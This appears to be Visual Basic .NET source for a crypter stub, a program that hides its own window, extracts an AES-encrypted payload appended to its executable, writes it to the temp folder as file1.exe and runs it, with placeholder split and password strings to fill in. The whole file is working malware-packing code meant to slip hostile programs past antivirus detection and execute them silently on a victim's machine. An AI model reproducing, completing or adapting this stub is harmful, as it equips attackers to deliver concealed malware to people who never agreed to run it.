Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.IO
Public Class Form1
    Dim sStub As String
    Dim TEMP As String = IO.Path.GetTempPath

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Me.Visible = False
            Me.Hide()
            Dim splittkey As String = "Your@Split@Here"
            Dim key As String = "YOUR@PASSWORD@HERE"
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            sStub = Space(LOF(1))
            FileGet(1, sStub)
            FileClose(1)

            Dim Splitter() As String
            Splitter = Split(sStub, splittkey)

            Dim todecrypt As String
            todecrypt = Splitter(1)

            Dim oAesProvider As New RijndaelManaged
            Dim btCipher() As Byte

            Dim btSalt() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
            Dim oKeyGenerator As New Rfc2898DeriveBytes(key, btSalt)
            oAesProvider.Key = oKeyGenerator.GetBytes(oAesProvider.Key.Length)
            oAesProvider.IV = oKeyGenerator.GetBytes(oAesProvider.IV.Length)

            Dim ms As New IO.MemoryStream
            Dim cs As New CryptoStream(ms, oAesProvider.CreateDecryptor(),
                CryptoStreamMode.Write)
            Try
                btCipher = Convert.FromBase64String(todecrypt)
                cs.Write(btCipher, 0, btCipher.Length)
                cs.Close()
                todecrypt = System.Text.Encoding.UTF8.GetString(ms.ToArray)
            Catch
            End Try

            FileOpen(1, TEMP + "\file1.exe", OpenMode.Binary)
            FilePut(1, todecrypt)
            FileClose(1)

            Shell(TEMP + "\file1.exe", AppWinStyle.NormalFocus)
        Catch ex As Exception
        End Try
        Me.Close()
    End Sub 
End Class
